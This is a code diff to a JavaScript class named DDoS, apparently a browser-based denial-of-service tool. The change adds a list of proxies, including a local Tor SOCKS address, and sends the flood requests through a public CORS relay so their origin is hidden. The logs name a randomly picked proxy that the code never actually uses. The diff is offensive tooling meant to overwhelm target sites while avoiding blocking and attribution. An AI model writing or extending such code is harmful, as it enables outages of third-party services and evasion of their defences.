@@ -111,6 +111,12 @@ class DDoS {
   this.log(`API Key generated: ${this.apiKey}`);
   this.setupResizeHandle();
   this.setupDragHandle();
+
+  this.availableProxies = [
+   'socks5://127.0.0.1:9050',
+   'http://proxy.example.com:8080',
+   'https://another.proxy.com:3128'
+  ];
  }
 
  setupDragHandle() {
@@ -671,14 +677,19 @@ class DDoS {
  }
 
  sendRequest(target, method, body = null) {
-  fetch(target, {
+  const proxy = this.availableProxies[Math.floor(Math.random() * this.availableProxies.length)];
+  const proxyUrl = `https://api.codetabs.com/v1/proxy/?quest=${encodeURIComponent(target)}`;
+
+  fetch(proxyUrl, {
     method: method,
     mode: 'no-cors',
     cache: 'no-cache',
-    body: body
+    body: body,
+    //credentials: 'include',
+    //redirect: 'follow'
    })
-   .then(() => this.log(`${method} request sent successfully.`))
-   .catch(err => this.log(`${method} request failed: ${err}`));
+   .then(() => this.log(`${method} request sent successfully via ${proxy}.`))
+   .catch(err => this.log(`${method} request failed via ${proxy}: ${err}`));
  }
 
  generateApiKey() {
